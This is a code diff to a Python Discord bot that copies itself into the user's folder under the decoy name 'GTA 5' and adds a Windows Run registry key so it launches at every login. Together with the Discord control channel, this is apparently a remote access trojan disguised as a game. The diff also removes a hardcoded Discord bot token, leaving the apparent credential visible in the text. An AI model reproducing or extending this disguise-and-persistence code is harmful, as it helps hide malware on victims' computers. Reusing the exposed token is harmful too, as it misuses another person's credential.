@@ -4,10 +4,11 @@ from shutil import copy2
 import os
 import sys
 from getpass import getuser
+import winreg
 
 client = discord.Client(intents=discord.Intents.all())
 
-bot_token = 'NzQ2ODMyMjU1OTE3NDkwMTg2.X0GDvQ.6NO59zJzo9w37fKC3z8CxboE9Sk'   # Paste here BOT-token
+bot_token = ''   # Paste here BOT-token
 software_registry_name = 'GTA 5'   # ---------------------------------------------- Software name shown in registry
 software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
 software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
@@ -22,6 +23,13 @@ if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + software_directory_
     except:
         pass
     copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
+
+    registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
+    winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
+    winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
+    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
+    winreg.SetValueEx(registry_key, software_registry_name, 0, winreg.REG_SZ, 'C:\\Users\\' + getuser() + '\\' + software_directory_name + '\\' + software_executable_name)
+    winreg.CloseKey(registry_key)
 
 @client.event
 async def on_ready():  
